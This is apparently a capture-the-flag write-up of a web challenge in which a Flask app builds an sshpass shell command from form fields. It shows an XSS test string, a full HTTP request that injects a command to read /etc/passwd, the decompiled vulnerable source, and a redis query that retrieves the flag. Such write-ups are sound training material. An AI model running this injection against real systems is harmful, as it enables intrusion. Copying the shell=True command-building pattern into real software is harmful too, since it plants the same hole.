# Remote Management System (Web)
At first, we provided real details in order to understand the application\'s logic.
    + Using `sshpass` utility, the server was connecting to an SSH server using the provided details
    + Upon login, the command `show config` was issued

We decided to test if the application would reflect back any output from the above command into the webpage. Thus, using `sudo cp /bin/cat /bin/show` we create a copy of the `cat` utility called `show` and using `echo "<script>aler(1)</script>" > config` we create the file that the server will request to read. Interestingly, the server reflected back the contents of the `config` file in the webpage and it was also vulnerable to XSS.

We tried several "payloads" in order to identify any other vulnerabilities like XXE, SSTI or characters that would break the applications logic. None of them worked.

Going back to the application, we tried to find a command injection vulnerability by manually trying to fuzz the available parameters using Burp. Good news, RCE was possible thus we started enumerating the server.

```
POST / HTTP/1.1
Host: spiderlabsctf.com:6060
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://spiderlabsctf.com:6060
Connection: close
Referer: http://spiderlabsctf.com:6060/
Upgrade-Insecure-Requests: 1

hostname=/&port=1&username=/&password=-w+less+-FX+/etc/passwd+%0a
```

After reading both `app.py` and `remoteapp.pyc` files (decompiled) we were unable to find the flag. We also used `grep FLAG -R /` in order to recursively check each file for the flag, without any luck.

app.py
```
import sys
from remoteapp import remoteapp
from flask import Flask, request, render_template, Response
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def manage():
    if len(request.form) > 0:
        output = remoteapp(request.form)
        return render_template('home.html', output=output)
    else:
        return render_template('home.html')
@app.route('/css/<path:path>')
def send_css(path):
    return Response(open("css/%s" % path, "r").read(), mimetype='text/css')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(sys.argv[1]))
```

remoteapp.py (decompiled)
```
import subprocess, re, redis
from flask import Markup

def remoteapp(data):
    try:
        password = check_param(data['password'])
        username = check_param(data['username'])
        hostname = check_param(data['hostname'])
        port = int(data['port'])
        cmd = 'sshpass -p %s ssh -o StrictHostKeyChecking=no -p %s %s@%s show config' % (password, port, username, hostname)
        print cmd
        output = subprocess.Popen([cmd], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout, stderr = output.communicate()
        return Markup("<div class='alert alert-warning'>%s</div>" % stdout)
    except:
        return Markup("<div class='alert alert-danger'>Could not fetch remote data</div>")


def check_param(data):
    if not re.match('^[a-zA-Z0-9 \\.:/\\-]*$', data):
        print '%s failed regex check' % data
        save_query(data)
        raise Exception('regex violation')
    return data


def save_query(data):
    instance = redis.StrictRedis(host='127.0.0.1', db=0)
    instance.set(data, data)
```

Finally, we saw that a redis server was running. Issuing a simple `redis-cli get FLAG` revealed the flag.

-ishtar
-CYberMouflons
